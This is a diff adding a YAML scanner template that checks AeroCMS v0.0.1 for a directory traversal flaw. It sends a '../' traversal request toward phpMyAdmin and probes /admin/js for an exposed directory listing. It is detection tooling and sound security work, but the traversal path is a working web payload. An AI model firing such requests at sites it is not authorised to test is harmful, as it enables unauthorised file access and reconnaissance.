@@ -1,0 +1,23 @@
+id: aero-cms-directory-traversal
+
+info:
+  name: AeroCMS v0.0.1 目录遍历漏洞
+  author: daffainfo
+  severity: medium
+  verified: false
+  description: AeroCMS v0.0.1 被发现包含目录遍历漏洞。该漏洞是由于未能规范化 url。该漏洞允许攻击者读取网站根目录中的任意文件。
+  reference:
+    - https://github.com/MegaTKC/AeroCMS/issues/7
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /includes/../../phpMyAdmin/index.php
+    expression: response.status == 200 && response.body.bcontains(b'<title>phpMyAdmin</title>')
+  r1:
+    request:
+      method: GET
+      path: /admin/js
+    expression: response.status == 200 && "<title>Index of /(.*)/admin/js</title>".bmatches(response.body) && "<h1>Index of /(.*)/admin/js</h1>".bmatches(response.body)
+expression: r0() || r1()
